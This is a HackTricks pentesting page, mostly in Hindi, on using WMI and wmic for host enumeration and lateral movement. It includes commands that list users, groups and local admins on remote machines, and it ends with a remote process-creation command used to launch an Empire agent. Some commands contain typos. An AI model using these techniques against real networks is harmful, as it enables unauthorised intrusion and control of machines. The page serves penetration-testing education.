# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>

## यह कैसे काम करता है

Wmi उन होस्टों में प्रक्रिया खोलने की अनुमति देता है जहां आप उपयोगकर्ता नाम / (पासवर्ड / हैश) को जानते हैं। फिर, Wmiexec wmi का उपयोग करके प्रत्येक आदेश को निष्पादित करने के लिए उपयोग किया जाता है (इसलिए Wmicexec आपको अर्ध-संवादात्मक शैल देता है)।

**dcomexec.py:** यह स्क्रिप्ट wmiexec.py के समान अर्ध-संवादात्मक शैल देता है, लेकिन यह विभिन्न DCOM अंत-बिंदुओं (ShellBrowserWindow DCOM ऑब्जेक्ट) का उपयोग करता है। वर्तमान में, इसमें MMC20 का समर्थन है। आवेदन, शैल विंडोज और शैल ब्राउज़र विंडो ऑब्जेक्ट (यहां से) (https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI मूलभूत

### नेमस्पेस

WMI को एक निर्देशिका-शैलीय वर्गीकरण में विभाजित किया गया है, \root कंटेनर के साथ अन्य निर्देशिकाएं \root के नीचे हैं। इन "निर्देशिका पथों" को नेमस्पेस कहा जाता है।\
नेमस्पेस सूची:
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
नामस्थान की कक्षाओं की सूची बनाएँ:
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **कक्षाएं**

WMI कक्षा नाम जैसे win32\_process किसी भी WMI कार्रवाई के लिए एक प्रारंभिक बिंदु है। हमें हमेशा एक कक्षा नाम और उसके स्थानांतरण क्षेत्र के बारे में जानने की आवश्यकता होती है।\
`win32` से शुरू होने वाली कक्षाओं की सूची:
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
कक्षा को कॉल करें:
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### विधियाँ

WMI कक्षाओं में एक या अधिक कार्य होते हैं जो क्रियान्वित किए जा सकते हैं। इन कार्यों को विधियाँ कहा जाता है।
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI जांच

### WMI सेवा की जांच करें

यहाँ आप देख सकते हैं कि क्या WMI सेवा चल रही है:
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### सिस्टम की जानकारी

To gather system information using WMIC, you can use the following command:

WMIC COMPUTERSYSTEM GET NAME, MANUFACTURER, MODEL, USERNAME, DOMAIN, TOTALPHYSICALMEMORY, TOTALVIRTUALMEMORYSIZE, OSNAME, OSARCHITECTURE, OSVERSION, LASTBOOTUPTIME

This command will provide you with the following information:

- **NAME**: The name of the computer.
- **MANUFACTURER**: The manufacturer of the computer.
- **MODEL**: The model of the computer.
- **USERNAME**: The username of the currently logged-in user.
- **DOMAIN**: The domain of the computer.
- **TOTALPHYSICALMEMORY**: The total physical memory (RAM) of the computer.
- **TOTALVIRTUALMEMORYSIZE**: The total virtual memory size of the computer.
- **OSNAME**: The name of the operating system.
- **OSARCHITECTURE**: The architecture of the operating system.
- **OSVERSION**: The version of the operating system.
- **LASTBOOTUPTIME**: The date and time when the computer was last booted up.

You can use this information to gain a better understanding of the target system and its configuration.
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### प्रक्रिया की जानकारी

To obtain information about running processes on a Windows system, you can use the `wmic` command. This command allows you to query various attributes of processes, such as their process ID (PID), parent process ID (PPID), command line arguments, and more.

To list all running processes, you can execute the following command:

```
wmic process get Caption,ProcessId,CommandLine
```

This will display the name of the process (`Caption`), its process ID (`ProcessId`), and the command line used to launch the process (`CommandLine`).

You can also filter the results based on specific criteria. For example, to find all processes with a specific name, you can use the `where` clause:

```
wmic process where "Name='process_name'" get Caption,ProcessId,CommandLine
```

Replace `process_name` with the name of the process you want to find.

Additionally, you can sort the results based on a specific attribute. For example, to sort the processes by their process ID in ascending order, you can use the `order by` clause:

```
wmic process get Caption,ProcessId,CommandLine /order by ProcessId
```

This will display the processes sorted by their process ID.

By using the `wmic` command, you can gather valuable information about running processes on a Windows system, which can be useful for troubleshooting, monitoring, or security purposes.
```bash
Get-WmiObject win32_process | Select Name, Processid
```
एक हमलावर के दृष्टिकोण से, WMI सिस्टम या डोमेन के बारे में संवेदनशील जानकारी की जांच में बहुत महत्वपूर्ण हो सकता है।
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **मैनुअल रिमोट WMI क्वेरी**

उदाहरण के लिए, यहां एक बहुत ही छिपी तरीका है जिससे रिमोट मशीन पर स्थानीय व्यवस्थापकों का पता लगाया जा सकता है (ध्यान दें कि डोमेन कंप्यूटर का नाम है):
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
एक और उपयोगी वनलाइनर है जिसका उपयोग मशीन पर कौन लॉग इन है देखने के लिए किया जा सकता है (जब आप एडमिन की खोज कर रहे हों):
```
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic` एक टेक्स्ट फ़ाइल से नोड पढ़ सकता है और उन पर कमांड चला सकता है। यदि आपके पास कार्यस्थलों की एक टेक्स्ट फ़ाइल है:
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**हम WMI के माध्यम से दूरस्थ रूप से एक प्रक्रिया बनाएंगे ताकि एक Empire एजेंट को क्रियान्वित किया जा सके:**
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
हम इसे सफलतापूर्वक निष्पादित होते देखते हैं (ReturnValue = 0)। और एक सेकंड के बाद हमारे एम्पायर सुनने वाले ने इसे पकड़ लिया है। ध्यान दें कि प्रक्रिया आईडी WMI द्वारा वापस दिया गया है।

यह सभी जानकारी यहां से निकाली गई है: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
